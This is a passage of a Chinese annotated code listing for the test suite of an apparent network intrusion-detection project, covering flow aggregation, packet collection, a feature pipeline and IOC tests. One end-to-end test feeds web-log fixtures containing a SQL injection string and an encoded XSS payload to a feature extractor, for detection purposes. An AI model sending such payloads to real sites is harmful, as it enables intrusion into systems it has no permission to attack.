| 292 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cat_part = X[:, n_numeric:]` |
| 293 | 注释：解释下面或当前这段代码的设计意图。 | `        # 两个类别列均应为 -1` |
| 294 | 断言：验证测试或运行时假设是否成立。 | `        assert (cat_part == FeaturePipeline.UNKNOWN_CATEGORY_CODE).all(), \` |
| 295 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"未知类别应编码为 -1,实际: {cat_part}"` |
| 296 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 297 | 函数定义：声明 `test_save_load_round_trip` 的输入、处理逻辑和返回结果。 | `    def test_save_load_round_trip(self):` |
| 298 | 文档字符串：说明当前模块、类或函数的职责。 | `        """save/load 往返后 transform 结果应一致。"""` |
| 299 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pipe = FeaturePipeline()` |
| 300 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        samples = self._build_train_samples()` |
| 301 | 函数调用：执行已有函数/方法完成当前步骤。 | `        pipe.fit(samples)` |
| 302 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        X_before = pipe.transform(samples)` |
| 303 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 304 | 上下文管理：自动管理资源打开与释放。 | `        with tempfile.TemporaryDirectory() as tmpdir:` |
| 305 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            path = os.path.join(tmpdir, 'pipeline.pkl')` |
| 306 | 函数调用：执行已有函数/方法完成当前步骤。 | `            pipe.save(path)` |
| 307 | 断言：验证测试或运行时假设是否成立。 | `            assert os.path.exists(path)` |
| 308 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 309 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            loaded = FeaturePipeline.load(path)` |
| 310 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            X_after = loaded.transform(samples)` |
| 311 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 312 | 断言：验证测试或运行时假设是否成立。 | `        assert np.allclose(X_before, X_after), "save/load 往返结果不一致"` |
| 313 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 314 | 函数定义：声明 `test_transform_before_fit_raises` 的输入、处理逻辑和返回结果。 | `    def test_transform_before_fit_raises(self):` |
| 315 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pipe = FeaturePipeline()` |
| 316 | 上下文管理：自动管理资源打开与释放。 | `        with pytest.raises(RuntimeError):` |
| 317 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            pipe.transform([{'a': 1}])` |
| 318 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 319 | 函数定义：声明 `test_empty_input_transform` 的输入、处理逻辑和返回结果。 | `    def test_empty_input_transform(self):` |
| 320 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pipe = FeaturePipeline()` |
| 321 | 函数调用：执行已有函数/方法完成当前步骤。 | `        pipe.fit(self._build_train_samples())` |
| 322 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        X = pipe.transform([])` |
| 323 | 断言：验证测试或运行时假设是否成立。 | `        assert X.shape == (` |
| 324 | 代码语句：参与当前文件的业务流程或数据处理。 | `            0,` |
| 325 | 函数调用：执行已有函数/方法完成当前步骤。 | `            len(pipe.numeric_columns) + len(pipe.categorical_columns),` |
| 326 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 327 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 328 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 329 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 330 | 注释：解释下面或当前这段代码的设计意图。 | `# 测试 4: 端到端集成` |
| 331 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 332 | 类定义：声明 `TestEndToEndIntegration`，封装相关状态与行为。 | `class TestEndToEndIntegration:` |
| 333 | 文档字符串：说明当前模块、类或函数的职责。 | `    """验证三个模块能端到端协同工作。"""` |
| 334 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 335 | 函数定义：声明 `test_flow_and_web_features_through_pipeline` 的输入、处理逻辑和返回结果。 | `    def test_flow_and_web_features_through_pipeline(self):` |
| 336 | 注释：解释下面或当前这段代码的设计意图。 | `        # 1) 构造数据包 -> FlowFeatureExtractor` |
| 337 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        packets = [` |
| 338 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'src_ip': '10.0.0.1', 'src_port': 1000, 'dst_ip': '10.0.0.2',` |
| 339 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'dst_port': 80, 'protocol': 'TCP',` |
| 340 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'timestamp': 0, 'packet_len': 100, 'tcp_flags': 'S'},` |
| 341 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'src_ip': '10.0.0.1', 'src_port': 1000, 'dst_ip': '10.0.0.2',` |
| 342 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'dst_port': 80, 'protocol': 'TCP',` |
| 343 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'timestamp': 0.1, 'packet_len': 500, 'tcp_flags': 'A'},` |
| 344 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'src_ip': '10.0.0.1', 'src_port': 1000, 'dst_ip': '10.0.0.2',` |
| 345 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'dst_port': 80, 'protocol': 'TCP',` |
| 346 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'timestamp': 0.2, 'packet_len': 800, 'tcp_flags': 'PA'},` |
| 347 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 348 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        flow_features = FlowFeatureExtractor().extract(packets)` |
| 349 | 断言：验证测试或运行时假设是否成立。 | `        assert len(flow_features) == 1` |
| 350 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 351 | 注释：解释下面或当前这段代码的设计意图。 | `        # 2) 构造 Web 日志 -> WebFeatureExtractor` |
| 352 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        web_logs = [` |
| 353 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'url': '/api/items?id=1', 'http_method': 'GET',` |
| 354 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'status_code': 200, 'response_size': 500},` |
| 355 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'url': "/login?u=admin'%20OR%201=1--", 'http_method': 'POST',` |
| 356 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'status_code': 401, 'response_size': 100},` |
| 357 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'url': '/q=%253Cscript%253Ealert(1)%253C%252Fscript%253E',` |
| 358 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'http_method': 'GET', 'status_code': 200, 'response_size': 0},` |
| 359 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 360 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        web_extractor = WebFeatureExtractor()` |
| 361 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        web_features = [web_extractor.extract(log) for log in web_logs]` |
| 362 | 断言：验证测试或运行时假设是否成立。 | `        assert len(web_features) == 3` |
| 363 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 364 | 注释：解释下面或当前这段代码的设计意图。 | `        # 3) 合并特征(去除不参与 ML 的冗余字段)` |
| 365 | 循环：逐个处理集合或迭代器中的元素。 | `        for wf in web_features:` |
| 366 | 函数调用：执行已有函数/方法完成当前步骤。 | `            wf.pop('url_raw', None)` |
| 367 | 函数调用：执行已有函数/方法完成当前步骤。 | `            wf.pop('url_decoded', None)` |
| 368 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 369 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        combined = flow_features + web_features` |
| 370 | 断言：验证测试或运行时假设是否成立。 | `        assert len(combined) == 4` |
| 371 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 372 | 注释：解释下面或当前这段代码的设计意图。 | `        # 4) FeaturePipeline.fit + transform` |
| 373 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pipe = FeaturePipeline()` |
| 374 | 函数调用：执行已有函数/方法完成当前步骤。 | `        pipe.fit(combined)` |
| 375 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        X = pipe.transform(combined)` |
| 376 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 377 | 断言：验证测试或运行时假设是否成立。 | `        assert X.shape[0] == 4` |
| 378 | 断言：验证测试或运行时假设是否成立。 | `        assert X.shape[1] > 0` |
| 379 | 断言：验证测试或运行时假设是否成立。 | `        assert not np.isnan(X).any(), "transform 结果含 NaN"` |
| 380 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 381 | 注释：解释下面或当前这段代码的设计意图。 | `        # 5) 验证 save/load 后整条流水线仍可运行` |
| 382 | 上下文管理：自动管理资源打开与释放。 | `        with tempfile.TemporaryDirectory() as tmpdir:` |
| 383 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            path = os.path.join(tmpdir, 'e2e_pipeline.pkl')` |
| 384 | 函数调用：执行已有函数/方法完成当前步骤。 | `            pipe.save(path)` |
| 385 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            reloaded = FeaturePipeline.load(path)` |
| 386 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            X2 = reloaded.transform(combined)` |
| 387 | 断言：验证测试或运行时假设是否成立。 | `        assert np.allclose(X, X2)` |
| 388 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 389 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 390 | 条件判断：满足条件时进入对应分支。 | `if __name__ == '__main__':` |
| 391 | 函数调用：执行已有函数/方法完成当前步骤。 | `    pytest.main([__file__, '-v'])` |

## `tests/test_flow_window_aggregator.py`

- 类型：测试
- 行数：168

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `R1 / P0：流窗口聚合器与主入口批量网络路径单元测试` |
| 3 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 4 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 7 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from types import SimpleNamespace` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))` |
| 11 | 条件判断：满足条件时进入对应分支。 | `if PROJECT_ROOT not in sys.path:` |
| 12 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, PROJECT_ROOT)` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 导入对象：从指定模块引入类、函数或常量。 | `from main import RuntimeConfig, SecurityGuardian  # noqa: E402` |
| 15 | 导入对象：从指定模块引入类、函数或常量。 | `from src.collectors.packet_collector import PacketCollector  # noqa: E402` |
| 16 | 导入对象：从指定模块引入类、函数或常量。 | `from src.features.flow_window_aggregator import (  # noqa: E402` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    FlowWindowAggregator,` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `    FlowWindowAggregatorConfig,` |
| 19 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 函数定义：声明 `_pkt` 的输入、处理逻辑和返回结果。 | `def _pkt(` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    src: str,` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    dst: str,` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sport: int,` |
| 26 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    dport: int,` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    proto: str,` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ts: float,` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    plen: int = 64,` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    flags: str = "",` |
| 31 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> dict:` |
| 32 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "src_ip": src,` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "dst_ip": dst,` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "src_port": sport,` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "dst_port": dport,` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "protocol": proto,` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "timestamp": ts,` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "packet_len": plen,` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "tcp_flags": flags,` |
| 41 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 42 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 43 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 44 | 类定义：声明 `TestFlowWindowAggregatorCrossTick`，封装相关状态与行为。 | `class TestFlowWindowAggregatorCrossTick:` |
| 45 | 文档字符串：说明当前模块、类或函数的职责。 | `    """同一五元组多包跨 tick：空闲超时后输出 1 条 network_flow_v1。"""` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 函数定义：声明 `test_three_packets_across_ticks_one_flow_feature` 的输入、处理逻辑和返回结果。 | `    def test_three_packets_across_ticks_one_flow_feature(self) -> None:` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg = FlowWindowAggregatorConfig(` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            min_flow_packets=3,` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            flow_idle_timeout_sec=0.05,` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            aggregation_window_sec=60.0,` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            single_packet_idle_policy="discard",` |
| 53 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        agg = FlowWindowAggregator(cfg)` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t0 = 1_700_000_000.0` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        flow = ("10.0.0.1", "10.0.0.2", 1000, 80, "TCP")` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 断言：验证测试或运行时假设是否成立。 | `        assert agg.tick([_pkt(*flow, t0, 60, "S")], now=t0) == []` |
| 59 | 断言：验证测试或运行时假设是否成立。 | `        assert agg.tick([_pkt(*flow, t0 + 0.001, 60, "SA")], now=t0 + 0.001) == []` |
| 60 | 断言：验证测试或运行时假设是否成立。 | `        assert agg.tick([_pkt(*flow, t0 + 0.002, 100, "PA")], now=t0 + 0.002) == []` |
| 61 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        outs = agg.tick([], now=t0 + 1.0)` |
| 63 | 断言：验证测试或运行时假设是否成立。 | `        assert len(outs) == 1` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        f = outs[0]` |
| 65 | 断言：验证测试或运行时假设是否成立。 | `        assert f["schema_version"] == "network_flow_v1"` |
| 66 | 断言：验证测试或运行时假设是否成立。 | `        assert f["packet_count"] == 3` |
| 67 | 断言：验证测试或运行时假设是否成立。 | `        assert f["byte_count"] == 60 + 60 + 100` |
| 68 | 断言：验证测试或运行时假设是否成立。 | `        assert f["flow_pkt_count"] == 3` |
| 69 | 断言：验证测试或运行时假设是否成立。 | `        assert f["flow_byte_count"] == 60 + 60 + 100` |
| 70 | 断言：验证测试或运行时假设是否成立。 | `        assert f["src_ip"] == "10.0.0.1"` |
| 71 | 断言：验证测试或运行时假设是否成立。 | `        assert f["dst_ip"] == "10.0.0.2"` |
| 72 | 断言：验证测试或运行时假设是否成立。 | `        assert f["src_port"] == 1000` |
| 73 | 断言：验证测试或运行时假设是否成立。 | `        assert f["dst_port"] == 80` |
| 74 | 断言：验证测试或运行时假设是否成立。 | `        assert f["protocol"] == "TCP"` |
| 75 | 断言：验证测试或运行时假设是否成立。 | `        assert f["flow_duration"] >= 0.0` |
| 76 | 断言：验证测试或运行时假设是否成立。 | `        assert f["flow_pkt_rate"] > 0` |
| 77 | 断言：验证测试或运行时假设是否成立。 | `        assert f["flow_byte_rate"] > 0` |
| 78 | 断言：验证测试或运行时假设是否成立。 | `        assert "window_unique_dst_ip" in f` |
| 79 | 断言：验证测试或运行时假设是否成立。 | `        assert "window_unique_dst_port" in f` |
| 80 | 断言：验证测试或运行时假设是否成立。 | `        assert isinstance(f["window_protocol_dist"], dict)` |
| 81 | 断言：验证测试或运行时假设是否成立。 | `        assert f.get("flow_low_confidence") is False` |
| 82 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 83 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 84 | 类定义：声明 `TestFlowWindowAggregatorSinglePacketPolicy`，封装相关状态与行为。 | `class TestFlowWindowAggregatorSinglePacketPolicy:` |
| 85 | 函数定义：声明 `test_single_packet_no_output_before_idle` 的输入、处理逻辑和返回结果。 | `    def test_single_packet_no_output_before_idle(self) -> None:` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg = FlowWindowAggregatorConfig(` |
| 87 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            min_flow_packets=2,` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            flow_idle_timeout_sec=10.0,` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            single_packet_idle_policy="discard",` |
| 90 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        agg = FlowWindowAggregator(cfg)` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t0 = 100.0` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        p = _pkt("1.1.1.1", "2.2.2.2", 1, 2, "TCP", t0, 100, "S")` |
| 94 | 断言：验证测试或运行时假设是否成立。 | `        assert agg.tick([p], now=t0) == []` |
| 95 | 断言：验证测试或运行时假设是否成立。 | `        assert agg.tick([], now=t0 + 1.0) == []` |
| 96 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 97 | 函数定义：声明 `test_single_packet_discard_after_idle` 的输入、处理逻辑和返回结果。 | `    def test_single_packet_discard_after_idle(self) -> None:` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg = FlowWindowAggregatorConfig(` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            min_flow_packets=2,` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            flow_idle_timeout_sec=0.01,` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            single_packet_idle_policy="discard",` |
| 102 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        agg = FlowWindowAggregator(cfg)` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t0 = 200.0` |
| 105 | 函数调用：执行已有函数/方法完成当前步骤。 | `        agg.tick([_pkt("1.1.1.1", "2.2.2.2", 1, 2, "TCP", t0, 100, "S")], now=t0)` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        outs = agg.tick([], now=t0 + 1.0)` |
| 107 | 断言：验证测试或运行时假设是否成立。 | `        assert outs == []` |
| 108 | 断言：验证测试或运行时假设是否成立。 | `        assert agg.counters.single_packet_discarded == 1` |
| 109 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 110 | 函数定义：声明 `test_single_packet_emit_low_confidence_after_idle` 的输入、处理逻辑和返回结果。 | `    def test_single_packet_emit_low_confidence_after_idle(self) -> None:` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg = FlowWindowAggregatorConfig(` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            min_flow_packets=2,` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            flow_idle_timeout_sec=0.01,` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            single_packet_idle_policy="emit_low_confidence",` |
| 115 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        agg = FlowWindowAggregator(cfg)` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t0 = 300.0` |
| 118 | 函数调用：执行已有函数/方法完成当前步骤。 | `        agg.tick([_pkt("1.1.1.1", "2.2.2.2", 1, 2, "TCP", t0, 100, "S")], now=t0)` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        outs = agg.tick([], now=t0 + 1.0)` |
| 120 | 断言：验证测试或运行时假设是否成立。 | `        assert len(outs) == 1` |
| 121 | 断言：验证测试或运行时假设是否成立。 | `        assert outs[0]["flow_low_confidence"] is True` |
| 122 | 断言：验证测试或运行时假设是否成立。 | `        assert outs[0]["packet_count"] == 1` |
| 123 | 断言：验证测试或运行时假设是否成立。 | `        assert agg.counters.low_confidence_emissions == 1` |
| 124 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 125 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 126 | 类定义：声明 `TestPacketCollectorQueueFull`，封装相关状态与行为。 | `class TestPacketCollectorQueueFull:` |
| 127 | 文档字符串：说明当前模块、类或函数的职责。 | `    """队列满时丢包计数递增（不抛异常）。"""` |
| 128 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 129 | 函数定义：声明 `test_drop_count_on_full_queue` 的输入、处理逻辑和返回结果。 | `    def test_drop_count_on_full_queue(self) -> None:` |
| 130 | 导入对象：从指定模块引入类、函数或常量。 | `        from scapy.all import IP, TCP` |
| 131 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 132 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collector = PacketCollector(queue_size=1)` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pkt = IP(src="1.2.3.4", dst="5.6.7.8") / TCP(sport=1, dport=2)` |
| 134 | 循环：逐个处理集合或迭代器中的元素。 | `        for _ in range(4):` |
| 135 | 函数调用：执行已有函数/方法完成当前步骤。 | `            collector._packet_callback(pkt)` |
| 136 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.packet_queue.qsize() == 1` |
| 137 | 断言：验证测试或运行时假设是否成立。 | `        assert collector.drop_count == 3` |
| 138 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 139 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 140 | 类定义：声明 `TestSecurityGuardianNetworkDrain`，封装相关状态与行为。 | `class TestSecurityGuardianNetworkDrain:` |
| 141 | 文档字符串：说明当前模块、类或函数的职责。 | `    """批量读取异常时记录错误计数且可继续调用。"""` |
| 142 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 143 | 函数定义：声明 `test_drain_increments_error_counter_on_get_packets_failure` 的输入、处理逻辑和返回结果。 | `    def test_drain_increments_error_counter_on_get_packets_failure(self) -> None:` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.environ.setdefault("ENABLE_PACKET_CAPTURE", "false")` |
| 145 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.environ.setdefault("ENABLE_WEB_LOG", "false")` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg = RuntimeConfig.from_env()` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg.enable_packet_capture = True` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg.enable_web_log = False` |
| 149 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        g = SecurityGuardian(cfg=cfg)` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        _n = 0` |
| 152 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 153 | 函数定义：声明 `_get_packets` 的输入、处理逻辑和返回结果。 | `        def _get_packets(*_a, **_k):` |
| 154 | 代码语句：参与当前文件的业务流程或数据处理。 | `            nonlocal _n` |
| 155 | 代码语句：参与当前文件的业务流程或数据处理。 | `            _n += 1` |
| 156 | 条件判断：满足条件时进入对应分支。 | `            if _n == 1:` |
| 157 | 抛出异常：主动报告不可继续的错误。 | `                raise RuntimeError("simulated queue read")` |
| 158 | 返回结果：把处理后的值交回调用方。 | `            return []` |
| 159 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        g.packet_collector = SimpleNamespace(get_packets=_get_packets)` |
| 161 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 162 | 断言：验证测试或运行时假设是否成立。 | `        assert g._packet_queue_read_errors == 0` |
| 163 | 函数调用：执行已有函数/方法完成当前步骤。 | `        g._drain_network_packets_this_tick()` |
| 164 | 断言：验证测试或运行时假设是否成立。 | `        assert g._packet_queue_read_errors == 1` |
| 165 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 166 | 函数调用：执行已有函数/方法完成当前步骤。 | `        g._drain_network_packets_this_tick()` |
| 167 | 断言：验证测试或运行时假设是否成立。 | `        assert g._packet_queue_read_errors == 1` |
| 168 | 断言：验证测试或运行时假设是否成立。 | `        assert _n == 2` |

## `tests/test_ioc_production.py`

- 类型：测试
- 行数：139

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""威胁情报生产化：IOC 过期、多源合并、外部超时降级、本地高置信命中。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import uuid` |
| 5 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import timedelta` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 7 | 导入对象：从指定模块引入类、函数或常量。 | `from unittest.mock import MagicMock, patch` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import pytest` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 函数定义：声明 `_flask_app` 的输入、处理逻辑和返回结果。 | `def _flask_app(monkeypatch, tmp_path):` |
| 13 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    db_file = tmp_path / "ioc_prod.db"` |
| 14 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("FLASK_ENV", "testing")` |
| 15 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("DATABASE_URL", f"sqlite:///{db_file.as_posix()}")` |
